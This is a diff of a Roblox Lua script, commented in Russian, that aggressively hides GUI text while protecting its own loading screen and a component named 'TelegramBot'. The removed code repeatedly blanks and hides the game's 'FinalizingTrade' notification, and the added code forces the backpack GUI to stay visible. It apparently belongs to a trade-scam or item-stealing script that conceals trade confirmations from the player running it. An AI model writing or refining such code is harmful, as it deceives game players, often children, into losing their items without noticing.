@@ -7,10 +7,9 @@ local LocalPlayer = Players.LocalPlayer
 
 -- 🛡️ УЛУЧШЕННОЕ АГРЕССИВНОЕ СКРЫТИЕ ТЕКСТА В GUI (с защитой собственного GUI)
 local PROTECTED_GUI_NAMES = {
-    "CustomLoadingUI",
-    "MainScript",
-    "TelegramBot",
-    'game:GetService("Players").LocalPlayer.PlayerGui.BackpackGui',
+    "CustomLoadingUI", -- Защищаем наш загрузочный экран
+    "MainScript", -- Если у вас есть другие собственные GUI
+    "TelegramBot" -- Добавьте сюда названия ваших GUI
 }
 
 local function isProtectedGUI(obj)
@@ -23,23 +22,34 @@ local function isProtectedGUI(obj)
                     return true
                 end
             end
+            -- СПЕЦИАЛЬНАЯ ЗАЩИТА для BackpackGui
+            if current.Name == "BackpackGui" then
+                return true
+            end
             break
         end
         current = current.Parent
     end
+    
     return false
 end
 
--- 🛡️ СПЕЦИАЛЬНАЯ ЗАЩИТА ОТ ТОРГОВЫХ УВЕДОМЛЕНИЙ
+-- 🛡️ ЗАЩИТА BackpackGui ОТ СКРЫТИЯ
 task.spawn(function()
     while true do
         pcall(function()
-            local tradingGui = LocalPlayer.PlayerGui:FindFirstChild("Trading")
-            if tradingGui then
-                local finalizingTrade = tradingGui:FindFirstChild("FinalizingTrade")
-                if finalizingTrade and finalizingTrade:IsA("TextLabel") then
-                    finalizingTrade.Text = ""
-                    finalizingTrade.Visible = false
+            -- Защищаем BackpackGui от скрытия
+            local backpackGui = LocalPlayer.PlayerGui:FindFirstChild("BackpackGui")
+            if backpackGui then
+                -- Принудительно показываем BackpackGui и все его элементы
+                backpackGui.Enabled = true
+                for _, child in ipairs(backpackGui:GetDescendants()) do
+                    if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
+                        child.Visible = true
+                        child.TextTransparency = 0
+                    elseif child:IsA("Frame") or child:IsA("ImageLabel") or child:IsA("ImageButton") then
+                        child.Visible = true
+                    end
                 end
             end
         end)
